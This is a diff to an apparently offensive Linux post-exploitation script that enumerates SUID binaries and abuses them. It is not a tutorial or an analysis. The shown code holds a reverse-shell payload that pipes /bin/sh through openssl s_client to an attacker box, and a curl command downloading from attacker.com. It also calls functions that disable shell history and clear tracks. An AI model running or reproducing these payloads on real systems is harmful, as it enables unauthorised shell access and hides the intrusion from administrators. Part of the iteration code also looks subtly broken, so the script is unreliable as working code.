@@ -117,7 +117,7 @@ def sudo_l():
 
 # try SUID/GUID files exloitation
 def suid():
-    print("\n ### finding SUID files... ###")
+    print("\n### finding SUID files... ###")
     suid_bins_print = {
     "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
     "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
@@ -164,7 +164,13 @@ def suid():
                 print(line)
             else:
                 continue
-        for key,value in suid_bins:
+        for key,value in suid_bins_print:
+            if key in suid:
+                print("\n{}: {}".format(key,value))
+            else:
+                continue
+
+        for key,value in suid_bins_exec:
             if key in suid:
                 print("\n{}: {}".format(key,value))
                 suid_cmd = value.strip()
@@ -260,8 +266,6 @@ def clear_tracks():
 
 
 # - call functions -
-
-# try sudo -l with given password
 disable_hist()
 sudo_l()
 suid()
